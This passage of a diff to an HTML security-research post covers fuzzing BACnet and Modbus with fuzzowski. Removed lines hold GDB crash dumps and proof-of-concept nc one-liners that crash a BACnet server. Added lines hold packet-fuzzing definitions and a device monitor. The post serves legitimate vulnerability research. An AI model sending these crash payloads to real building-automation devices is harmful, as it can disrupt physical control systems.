-ss             0x2b 43
-ds             0x0  0
-es             0x0  0
-fs             0x0  0
-gs             0x0  0
-
---- Backtrace ---
-
-
-Thread 1 (Thread 0x7ffff7fe2740 (LWP 21011)):
-#0  0x0000000000413760 in decode_tag_number ()
-No symbol table info available.
-#1  0x0000000000413974 in decode_is_context_tag ()
-No symbol table info available.
-#2  0x0000000000418428 in dcc_decode_service_request ()
-No symbol table info available.
-#3  0x000000000041e079 in handler_device_communication_control ()
-No symbol table info available.
-#4  0x00000000004134f7 in apdu_handler ()
-No symbol table info available.
-#5  0x000000000041c508 in npdu_handler ()
-No symbol table info available.
-#6  0x000000000040169a in main ()
-No symbol table info available.
-
+Network_Layer_Message_Type = [
+    '\x00',  # Who-Is-Router-To-Network
+    '\x01',  # I-Am-Router-To-Network
+    '\x02',  # I-Could-Be-Router-To-Network
+    '\x03',  # Reject-Message-To-Network
+    '\x04',  # Router-Busy-To-Network
+    '\x05',  # Router-Available-To-Network 
+    '\x06',  # Initialize-Routing-Table
+    '\x07',  # Initialize-Routing-Table-ACK
+    '\x08',  # Establish-Connection-To-Network
+    '\x09',  # Disconnect-Connection-To-Network
+    '\x0a',  # Challenge-Request
+    '\x0b',  # Security-Payload
+    '\x0c',  # Security-Response
+    '\x0d',  # Request-Key-Update
+    '\x0e',  # Update-Key-Set
+    '\x0f',  # Update-Distribution-Key
+    '\x10',  # Request-Master-Key
+    '\x11'  # Set-Master-Key
+    # 0x12 to 0x7F Reserved for use by ASHRAE
+    # 0x80 to 0xFF Available for Vendor Proprietary Messages
+]
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;fault-in-atomic-read-file-service&quot;&gt;Fault in Atomic Read File Service&lt;/h2&gt;
+&lt;p&gt;Here we can found the class where was defined the fuzzer and the methods that define all the operations that could be used to fuzz a BACnet device or server. In the example has been defined methods to fuzz DeviceCommunicationControl, who_is, i_Am, Initialize_Routing_Table, Who_Is_Router_To_Network, readProperty, atomicReadFile and atomicWriteFile. More can be defined, just adding the definition of the packet or operation.&lt;/p&gt;
 
-&lt;p&gt;Stack and GDB output for segmentation fault in the Atomic Read File service:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class BACnet(IFuzzer):
+    &quot;&quot;&quot;
+    BACnet Fuzzing Module example
+    virtualenv venv -p python3
+    source venv/bin/activate
+    pip install -r requirements.txt
+    python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -m BACnetMon
+    python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -r who_is -m BACnetMon
+    python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -r DeviceCommunicationControl -m BACnetMon
+    &quot;&quot;&quot;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
-Signal si_signo: 11 Signal si_addr: 18446744073168944418
-Nearby code:
-   0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
-   0x0000000000413751 &amp;lt;+22&amp;gt;:    xor    eax,eax
-   0x0000000000413753 &amp;lt;+24&amp;gt;:    mov    rsi,rbp
-   0x0000000000413756 &amp;lt;+27&amp;gt;:    mov    edi,0x426a0a
-   0x000000000041375b &amp;lt;+32&amp;gt;:    call   0x401170 &amp;lt;printf@plt&amp;gt;
-=&amp;gt; 0x0000000000413760 &amp;lt;+37&amp;gt;:    mov    al,BYTE PTR [rbp+0x0]
-   0x0000000000413763 &amp;lt;+40&amp;gt;:    mov    dl,al
-   0x0000000000413765 &amp;lt;+42&amp;gt;:    and    edx,0xfffffff0
-   0x0000000000413768 &amp;lt;+45&amp;gt;:    cmp    dl,0xf0
-   0x000000000041376b &amp;lt;+48&amp;gt;:    jne    0x413779 &amp;lt;decode_tag_number+62&amp;gt;
-Stack trace:
-#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  1 decode_tag_number_and_value at 0x4137f9 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  2 arf_decode_service_request at 0x417df8 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  3 handler_atomic_read_file at 0x41d9ab in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-Description: Access violation on source operand
-Short description: SourceAv (19/22)
-Hash: 39996a2c279b3763d9d7c9d644e36915.5dfb5ba5080de8d79c6b66b3f106b103
-Exploitability Classification: UNKNOWN
-Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
-Other tags: AccessViolation (21/22)
+    name = 'bacnet'
 
---- Info Frame ---
+    @staticmethod
+    def get_requests() -&amp;gt; List[callable]:
+        return [BACnet.DeviceCommunicationControl, BACnet.who_is, BACnet.i_Am, BACnet.Initialize_Routing_Table, BACnet.Who_Is_Router_To_Network, BACnet.readProperty, BACnet.atomicReadFile, BACnet.atomicWriteFile]
 
-Stack level 0, frame at 0x7fffffffdc50:
- rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
- called by frame at 0x7fffffffdc80
- Arglist at 0x7fffffffdc30, args: 
- Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
- Saved registers:
-  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48
+    @staticmethod
+    def define_nodes(*args, **kwargs) -&amp;gt; None:
+        
+        # ---------------- DeviceCommunicationControl ------------------- #
+        # Used in CVE-2019-12480
+        # Start DeviceCommunicationControl bacnet request packet
+        s_initialize(&quot;DeviceCommunicationControl&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0a, name='function_bvlc', fuzzable=False)
+            s_word(0x0017, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version_bacnet', fuzzable=False)
+            s_byte(0x04, name='control_bacnet', fuzzable=False)
+        with s_block(&quot;bacnet_apdu&quot;):
+            s_byte(0x02, name='type_bacapp', fuzzable=True)
+            s_byte(0x44, name='max_adpu_size_bacapp', fuzzable=True)
+            s_byte(0x08, name='invoke_id_bacapp', fuzzable=True)
+            s_byte(0x11, name='confirmed_service_bacapp', fuzzable=True)
+            s_byte(0x0d, name='context_tag', fuzzable=True)
+            s_byte(0xff, name='tag_class', fuzzable=True)
+            s_byte(0x80, name='tag_number', fuzzable=True)
+            s_word(0x0000, name='enable', endian='&amp;gt;', fuzzable=True)
+            s_word(0x0000, name='passwd_length', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x00, name='lvt', fuzzable=True)
+            s_dword(0x0a1a0300, name='lenght_value_type', endian='&amp;gt;', fuzzable=True)
+            s_word(0x1900, name='enable-disable', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x2a, name='lvt_passwd', fuzzable=True)
+            s_byte(0x00, name='string_char_set', fuzzable=True)
+            s_string('A', name='passwd', fuzzable=True)
+        # end bacnet DeviceCommunicationControl
+        # ---------------- DeviceCommunicationControl ------------------- #
+        
+        # ------------------------- Who-Is ------------------------------ #
+        # Start Who-Is bacnet request packet
+        s_initialize(&quot;who_is&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0b, name='function_bvlc', fuzzable=False)
+            s_word(0x000c, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version_bacnet', fuzzable=True)
+            s_byte(0x20, name='control_bacnet', fuzzable=True)
+            s_word(0xffff, name='detination', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x00, name='mac', fuzzable=True)
+            s_byte(0xff, name='hop', fuzzable=True)
+        with s_block(&quot;bacnet_apdu&quot;):
+            s_byte(0x10, name='type_bacapp', fuzzable=True)
+            s_byte(0x08, name='confirmed_service_bacapp', fuzzable=True)
+        # end
+        # ------------------------- Who-Is ------------------------------ #
 
---- Info Registers ---
-
-rax            0x11 17
-rbx            0x7fffffffdc89   140737488346249
-rcx            0x10 16
-rdx            0x0  0
-rsi            0x0  0
-rdi            0x7fffffffd700   140737488344832
-rbp            0xffffffffdfc6fd22   0xffffffffdfc6fd22
-rsp            0x7fffffffdc30   0x7fffffffdc30
-r8             0x1  1
-r9             0x7ffff7a5b14d   140737348219213
-r10            0x65626d756e5f6761   7305521896678713185
-r11            0x0  0
-r12            0xffffffffdfc6fd22   -540607198
-r13            0x640f1b 6557467
-r14            0x640f16 6557462
-r15            0x11 17
-rip            0x413760 0x413760 &amp;lt;decode_tag_number+37&amp;gt;
-eflags         0x10206  [ PF IF RF ]
-cs             0x33 51
-ss             0x2b 43
-ds             0x0  0
-es             0x0  0
-fs             0x0  0
-gs             0x0  0
-
---- Backtrace ---
-
-
-Thread 1 (Thread 0x7ffff7fe2740 (LWP 20992)):
-#0  0x0000000000413760 in decode_tag_number ()
-No symbol table info available.
-#1  0x00000000004137f9 in decode_tag_number_and_value ()
-No symbol table info available.
-#2  0x0000000000417df8 in arf_decode_service_request ()
-No symbol table info available.
-#3  0x000000000041d9ab in handler_atomic_read_file ()
-No symbol table info available.
-#4  0x00000000004134f7 in apdu_handler ()
-No symbol table info available.
-#5  0x000000000041c508 in npdu_handler ()
-No symbol table info available.
-#6  0x000000000040169a in main ()
-No symbol table info available.
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;fault-in-atomic-write-file-service&quot;&gt;Fault in Atomic Write File Service&lt;/h3&gt;
-
-&lt;p&gt;Stack and GDB output for segmentation fault in the Atomic Write File service:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
-Signal si_signo: 11 Signal si_addr: 18446744072714559995
-Nearby code:
-   0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
-   0x0000000000413751 &amp;lt;+22&amp;gt;:    xor    eax,eax
-   0x0000000000413753 &amp;lt;+24&amp;gt;:    mov    rsi,rbp
-   0x0000000000413756 &amp;lt;+27&amp;gt;:    mov    edi,0x426a0a
-   0x000000000041375b &amp;lt;+32&amp;gt;:    call   0x401170 &amp;lt;printf@plt&amp;gt;
-=&amp;gt; 0x0000000000413760 &amp;lt;+37&amp;gt;:    mov    al,BYTE PTR [rbp+0x0]
-   0x0000000000413763 &amp;lt;+40&amp;gt;:    mov    dl,al
-   0x0000000000413765 &amp;lt;+42&amp;gt;:    and    edx,0xfffffff0
-   0x0000000000413768 &amp;lt;+45&amp;gt;:    cmp    dl,0xf0
-   0x000000000041376b &amp;lt;+48&amp;gt;:    jne    0x413779 &amp;lt;decode_tag_number+62&amp;gt;
-Stack trace:
-#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  1 decode_tag_number_and_value at 0x4137f9 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  2 awf_decode_service_request at 0x42062b in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  3 handler_atomic_write_file at 0x41dc13 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
-Description: Access violation on source operand
-Short description: SourceAv (19/22)
-Hash: 30f5f3fdb0db788098ed886be3d45933.f25bdc8062c3fd1d5fec8cfd4c618d89
-Exploitability Classification: UNKNOWN
-Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
-Other tags: AccessViolation (21/22)
-
---- Info Frame ---
-
-Stack level 0, frame at 0x7fffffffdc50:
- rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
- called by frame at 0x7fffffffdc80
- Arglist at 0x7fffffffdc30, args: 
- Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
- Saved registers:
-  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48
-
---- Info Registers ---
-
-rax            0x11 17
-rbx            0x7fffffffdc81   140737488346241
-rcx            0x10 16
-rdx            0x0  0
-rsi            0x0  0
-rdi            0x7fffffffd700   140737488344832
-rbp            0xffffffffc4b1a1fb   0xffffffffc4b1a1fb
-rsp            0x7fffffffdc30   0x7fffffffdc30
-r8             0x1  1
-r9             0x7ffff7a5b14d   140737348219213
-r10            0x65626d756e5f6761   7305521896678713185
-r11            0x0  0
-r12            0xffffffffc4b1a1fb   -994991621
-r13            0x640f1b 6557467
-r14            0x640f16 6557462
-r15            0x21 33
-rip            0x413760 0x413760 &amp;lt;decode_tag_number+37&amp;gt;
-eflags         0x10206  [ PF IF RF ]
-cs             0x33 51
-ss             0x2b 43
-ds             0x0  0
-es             0x0  0
-fs             0x0  0
-gs             0x0  0
-
---- Backtrace ---
+        # ------------------- Initialize_Routing_Table ------------------ #
+        # Start Initialize_Routing_Table bacnet request packet
+        s_initialize(&quot;Initialize_Routing_Table&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0b, name='function_bvlc', fuzzable=False)
+            s_word(0x0008, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version_bacnet', fuzzable=True)
+            s_byte(0x80, name='control_bacnet', fuzzable=True)
+            s_byte(0x06, name='message_type', fuzzable=True)
+            s_byte(0x00, name='rpot_number', fuzzable=True)
+        # end
+        # ------------------- Initialize_Routing_Table ------------------ #
 
 
-Thread 1 (Thread 0x7ffff7fe2740 (LWP 20726)):
-#0  0x0000000000413760 in decode_tag_number ()
-No symbol table info available.
-#1  0x00000000004137f9 in decode_tag_number_and_value ()
-No symbol table info available.
-#2  0x000000000042062b in awf_decode_service_request ()
-No symbol table info available.
-#3  0x000000000041dc13 in handler_atomic_write_file ()
-No symbol table info available.
-#4  0x00000000004134f7 in apdu_handler ()
-No symbol table info available.
-#5  0x000000000041c508 in npdu_handler ()
-No symbol table info available.
-#6  0x000000000040169a in main ()
-No symbol table info available.
+        # ------------------ Who_Is_Router_To_Network ------------------- #
+        # Start Who_Is_Router_To_Network bacnet request packet 
+        s_initialize(&quot;Who_Is_Router_To_Network&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0b, name='function_bvlc', fuzzable=False)
+            s_word(0x0007, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version_bacnet', fuzzable=True)
+            s_byte(0x80, name='control_bacnet', fuzzable=True)
+            s_byte(0x00, name='message_type', fuzzable=True)
+        # end
+        # ------------------ Who_Is_Router_To_Network ------------------- #
+        
+        # ---------------------------- i-Am ----------------------------- #
+        # Start i-Am bacnet request packet 
+        s_initialize(&quot;i_Am&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0b, name='function_bvlc', fuzzable=False)
+            s_word(0x0018, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version_bacnet', fuzzable=True)
+            s_byte(0x20, name='control_bacnet', fuzzable=True)
+            s_word(0xffff, name='destination', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x00, name='destination_mac', fuzzable=True)
+            s_byte(0xff, name='hop_count', fuzzable=True)
+        with s_block(&quot;bacnet_apdu&quot;):
+            s_byte(0x10, name='type_bacapp', fuzzable=True)
+            s_byte(0x00, name='confirmed_service_bacapp', fuzzable=True)
+            # deviceID
+            s_byte(0xc4, name='ObjectIdentifier_device', fuzzable=True)
+            s_byte(0x02, name='ObjectIdentifier_instance_number', fuzzable=True)
+            s_byte(DeviceID_byte1, name='ObjectIdentifier_deviceID_byte1', fuzzable=True)
+            s_byte(DeviceID_byte2, name='ObjectIdentifier_deviceID_byte2', fuzzable=True)
+            s_byte(DeviceID_byte3, name='ObjectIdentifier_deviceID_byte3', fuzzable=True)
+            # deviceID
+            s_byte(0x22, name='lvt', fuzzable=True)
+            s_word(0x0400, name='max_adpu_size_bacapp', endian='&amp;gt;', fuzzable=True)
+            s_word(0x9100, name='segmented_both', endian='&amp;gt;', fuzzable=True)
+            s_word(0x2105, name='vendor_id', endian='&amp;gt;', fuzzable=True)
+        # end
+        # ---------------------------- i-Am ----------------------------- #
+        
+        # ------------------------- readProperty ------------------------ #
+        # Start readProperty bacnet request packet
+        s_initialize(&quot;readProperty&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0b, name='function_bvlc', fuzzable=False)
+            s_word(0x0011, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version', fuzzable=False)
+            s_byte(0x04, name='control', fuzzable=False)
+        with s_block(&quot;bacnet_apdu&quot;):
+            s_byte(0x02, name='type_bacapp', fuzzable=False)
+            s_byte(0x44, name='max_adpu_size_bacapp', fuzzable=True)
+            s_byte(0x03, name='invoke_id_bacapp', fuzzable=True)
+            s_byte(0x0c, name='confirmed_service_bacapp', fuzzable=True)
+            # deviceID
+            s_byte(0x0c, name='ObjectIdentifier_deviceID', fuzzable=True)
+            s_byte(0x02, name='ObjectIdentifier_instance_number', fuzzable=True)
+            s_byte(DeviceID_byte1, name='ObjectIdentifier_deviceID_byte1', fuzzable=True)
+            s_byte(DeviceID_byte2, name='ObjectIdentifier_deviceID_byte2', fuzzable=True)
+            s_byte(DeviceID_byte3, name='ObjectIdentifier_deviceID_byte3', fuzzable=True)
+            s_word(0x194b, name='property_identifier_bacapp', endian='&amp;gt;', fuzzable=True)
+        # end
+        # ------------------------- readProperty ------------------------ #
+
+        # ------------------------- atomicReadFile ----------------------- #
+        # Start atomicReadFile bacnet request packet
+        s_initialize(&quot;atomicReadFile&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0a, name='function_bvlc', fuzzable=False)
+            s_word(0x001b, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version', fuzzable=False)
+            s_byte(0x04, name='control', fuzzable=False)
+        with s_block(&quot;bacnet_apdu&quot;):
+            s_byte(0x00, name='type_bacapp', fuzzable=False)
+            s_byte(0x05, name='max_adpu_size_bacapp', fuzzable=True)
+            s_byte(0x01, name='invoke_id_bacapp', fuzzable=True)
+            s_byte(0x06, name='confirmed_service_bacapp', fuzzable=True)
+            # file
+            s_dword(0xc4028000, name='file', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x00, name='ObjectIdentifier', fuzzable=True)
+            # stream
+            s_word(0x0e35, name='named_tag', endian='&amp;gt;', fuzzable=True)
+            s_dword(0xffdf62ee, name='lvt', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x00, name='ObjectIdentifier_2', fuzzable=True)
+            s_dword(0x00220584, name='text', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x0f, name='named_tag_2', fuzzable=True)
+        # end
+        # ------------------------- atomicReadFile ----------------------- #
+
+        # ------------------------- atomicWriteFile ---------------------- #
+        # Start atomicWriteFile bacnet request packet
+        s_initialize(&quot;atomicWriteFile&quot;)
+        with s_block(&quot;bacnet_virtual_link_control&quot;):
+            s_byte(0x81, name='type_bvlc', fuzzable=False)
+            s_byte(0x0a, name='function_bvlc', fuzzable=False)
+            s_word(0x001b, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+        with s_block(&quot;bacnet_npdu&quot;):
+            s_byte(0x01, name='version', fuzzable=False)
+            s_byte(0x04, name='control', fuzzable=False)
+        with s_block(&quot;bacnet_apdu&quot;):
+            s_byte(0x00, name='type_bacapp', fuzzable=False)
+            s_byte(0x05, name='max_adpu_size_bacapp', fuzzable=True)
+            s_byte(0x02, name='invoke_id_bacapp', fuzzable=True)
+            s_byte(0x07, name='confirmed_service_bacapp', fuzzable=True)
+            # file
+            s_dword(0xc4028000, name='file', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x00, name='ObjectIdentifier', fuzzable=True)
+            # stream
+            s_word(0x0e35, name='named_tag', endian='&amp;gt;', fuzzable=True)
+            s_dword(0xff5ed5c0, name='lvt', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x85, name='ObjectIdentifier_2', fuzzable=True)
+            s_dword(0x0a62640a, name='text', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x0f, name='named_tag_2', fuzzable=True)
+        # end
+        # ------------------------- atomicWriteFile ---------------------- #
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h1 id=&quot;exploits&quot;&gt;Exploits&lt;/h1&gt;
+&lt;p&gt;So we can start launching the fuzzer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -m BACnetMon&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;Based on previous information were developed some exploits as Proof of concept.&lt;/p&gt;
+&lt;p&gt;While Fuzzing we can found errors like observed in the image below that could bring to us some information of the issue like a segmentation fault or error in the server that could help in a further attack. In the next image can be observed that the monitor defined for this fuzzer has been detected no response from the server and launched a fail message:&lt;/p&gt;
 
-&lt;h2 id=&quot;bash&quot;&gt;Bash&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;public/images/BACnet-fuzz-fault.png&quot; alt=&quot;BACnet-fuzz-fault&quot; title=&quot;BACnet-fuzz-fault&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Device Communication Control payload:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41' | nc -u 192.168.10.10 47808
+&lt;p&gt;If an error is detected, fuzzowski offers a cool functionallity that help us to generates a proof of concept of any fault identified.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;public/images/BACnet-fuzz-poc.jpg&quot; alt=&quot;BACnet-fuzz-poc&quot; title=&quot;BACnet-fuzz-poc&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bacnet-monitor&quot;&gt;BACnet Monitor&lt;/h2&gt;
+
+&lt;p&gt;Fuzzing is not the magic thing that provide us a way to found vulnerabilities, one of the most important things apart from define the fuzzer is to develop the monitor, and implement how we want to identify faults in the fuzzed system. In this case we have defined a &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/bacnet/bacnetmonitor.py&quot;&gt;monitor&lt;/a&gt; for the BACnet fuzzer that sends a query for Property Identifier ID to the target in order to get the BACnet device information and check the response. In our case if the BACnet device does not respond to this query a fault is generated or identified, and indeed all the faults are needed to be double checked to verify if exists or not an issue, crash or other type of output that could us help in a further attack.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class BACnetMonitor(IMonitor):
+    &quot;&quot;&quot;
+    BACnet Monitor Module interface
+    @Author: https://github.com/1modm
+    Based on https://svn.nmap.org/nmap/scripts/bacnet-info.nse
+    &quot;&quot;&quot;
+
+    get_bacnet_property_identifier_id = (b&quot;\x81&quot;  # Type: BACnet/IP (Annex J)
+                                   b&quot;\x0a&quot;  # Function: Original-Unicast-NPDU
+                                   b&quot;\x00\x11&quot;  # BVLC-Length: 4 of 17 bytes
+                                   # BACnet NPDU
+                                   b&quot;\x01&quot;  # Version: 0x01 (ASHRAE 135-1995)
+                                   b&quot;\x04&quot;  # Control (expecting reply)
+                                   # BACnet APDU
+                                   b&quot;\x00&quot;  # APDU Type: Confirmed-REQ, PDU flags: 0x0
+                                   b&quot;\x05&quot;  # Max response segments unspecified, Max APDU size: 1476 octets
+                                   b&quot;\x01&quot;  # Invoke ID: 1
+                                   b&quot;\x0c&quot;  # Service Choice: readProperty
+                                   b&quot;\x0c&quot;  # Context-specific tag, number 0, Length Value Type 4
+                                   b&quot;\x02\x3f\xff\xff&quot; # Object Type: device; instance number 4194303
+                                   b&quot;\x19\x4b&quot; # Context-specific tag, number 1, Length Value Type 1
+                                   # TODO, send DeviceID
+                                   )
+
+    @staticmethod
+    def name() -&amp;gt; str:
+        return &quot;BACnetMon&quot;
+
+    @staticmethod
+    def help():
+        return &quot;Sends a query for Property Identifier id to the target in order to get the BACnet device information and check the response&quot;
+
+    def test(self):
+        conn = self.get_connection_copy()
+        result = self._get_bacnet_info(conn)
+        return result
+
+    def _get_bacnet_info(self, conn: ITargetConnection):
+        try:
+            conn.open()
+            conn.send(self.get_bacnet_property_identifier_id)
+            data = conn.recv_all(10000)
+            if len(data) == 0:
+                self.logger.log_error(&quot;BACnet error response, getting BACnet device information Failed!!&quot;)
+                result = False
+            else:
+                # validate valid BACNet Packet and verify that the response APDU was not an error packet
+                if hex(data[0]) == '0x81' and hex(data[1]) == '0xa' and hex(data[6]) != '0x50':
+                  self.logger.log_info(f&quot;Getting BACnet device information succeeded&quot;)
+                else:
+                  self.logger.log_warn(f&quot;Getting BACnet error response in the APDU&quot;)
+                result = True
+        except Exception as e:
+            self.logger.log_error(f&quot;BACnet error response, getting BACnet device information Failed!! Exception while receiving: {type(e).__name__}. {str(e)}&quot;)
+            result = False
+        finally:
+            conn.close()
+
+        return result
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Atomic Read File service payload:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f' | nc -u 192.168.10.10 47808
+&lt;p&gt;In the next image can be found the request sent to check if the BACnet device is still working:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;public/images/BACnet-monitor-request.png&quot; alt=&quot;BACnet-monitor-request&quot; title=&quot;BACnet-monitor-request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the response in which can be observed that the device send the Instance Number (12345) of our target server tested:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;public/images/BACnet-monitor-response.png&quot; alt=&quot;BACnet-monitor-response&quot; title=&quot;BACnet-monitor-response&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;fuzzing-modbus&quot;&gt;Fuzzing Modbus&lt;/h1&gt;
+
+&lt;p&gt;In the same way than our previous protocol fuzzer, a &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/modbus/modbus.py&quot;&gt;modbus fuzzer&lt;/a&gt; has been uploaded as an example. And the way we could launch the fuzzer using the &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/modbus/modbusmonitor.py&quot;&gt;monitor&lt;/a&gt; implemented could be: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 1 -m modbusMon&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The modbus class has the next methods implemented that could be used to fuzz any modbus/TCP server; read_coil, read_input, read_holding, read_discrete, single_coil, single_register, multiple_coil, multiple_register&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class MODBUS(IFuzzer):
+    &quot;&quot;&quot;
+    MODBUS Fuzzing Module
+    Use at your own risk, and please do not use in a production environment
+    @Author: https://github.com/1modm
+    Based on https://github.com/youngcraft/boofuzz-modbus
+    and https://github.com/riptideio/pymodbus
+    virtualenv venv -p python3
+    source venv/bin/activate
+    pip install -r requirements.txt
